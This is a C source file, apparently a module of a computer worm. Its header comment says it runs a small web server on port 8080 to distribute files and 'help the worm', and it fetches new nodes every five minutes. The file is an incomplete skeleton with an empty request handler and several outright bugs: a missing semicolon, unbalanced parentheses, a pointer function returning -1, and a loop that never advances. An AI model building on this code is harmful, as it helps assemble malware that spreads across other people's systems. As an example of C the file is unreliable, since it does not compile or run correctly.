/*
httpd - small web server..

to help distribute information, files, and help the worm

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include "../../list.h"
#include "../../structs.h"
#include "../../utils.h"

#define HTTP_TCP_TIMEOUT 15

Content *content_list = NULL;

enum {
    // new is brand new connection
    HTTP_STATE_NEW,
    // headers is waiting for headers.. (after GET, etc)
    HTTP_STATE_HEADERS,
    // when a file is queued to them.. set to this..
    HTTP_STATE_DOWNLOADING,
    // complete = state OK, or done.. we can time out after 15... or close before
    HTTP_STATE_COMPLETE=1024
}

// function declarations for httpd's requirements'
int httpd_incoming(Modules *, Connection *, char *buf, int size);
int httpd_plumbing(Modules *, Connection *, char *buf, int size);


ModuleFuncs httpd_funcs = {
    NULL, NULL, 
    &httpd_incoming,
    NULL,
    &httpd_plumbing,
    NULL, // no connect
    NULL, // no disconnect
    NULL, NULL
};

Modules ModuleHTTPD = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    8080, 0,
    // required 0, 0..  
    0, 0,
    //timer = 300 seconds (5min) - get new nodes, etc
    300,
    // httpd functions
    &httpd_funcs, NULL,
    NULL, 0
};


Content *ContentAdd(char *filename, char *data, int size, int type) {
    Content *cptr = NULL;
    char *buf = NULL;
    
    if (((cptr = (Content *)malloc(sizeof(Content))) == NULL) || ((buf = malloc(size)) == NULL)
        return -1;

    memcpy(buf, data, size);
            
    cptr->filename = strdup(filename);
    cptr->data_size = size;
    cptr->type = type;
    cptr->data = buf;
    
    return cptr;
}

Content *ContentFindByName(char *filename) {
    Content *cptr = content_list;
    
    while (cptr != NULL) {
        if (strcasestr(cptr->filename, filename)==0) break;
        cptr = cptr->next;
    }
    
    return cptr;
}



int httpd_init(Modules **list) {
    Module_Add(list, &ModuleHTTPD);
}

int httpd_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}

int httpd_plumbing(Modules *mptr, Connection *conn, char *buf, int size) {
    Connection *cptr = NULL;
    int cur_ts = time(0);
    
    // kill connections that arent transferring files and are older than 15 seconds
    cptr = mptr->connections;
    while (cptr != NULL) {
        // state != OK when transferring..
        if (!stateOK(cptr)) continue;
        
        if ((cur_ts - cptr->start_ts) > HTTP_TCP_TIMEOUT) {
            ConnectionBad(cptr);
        }
        
        cptr = cptr->next;
    }
}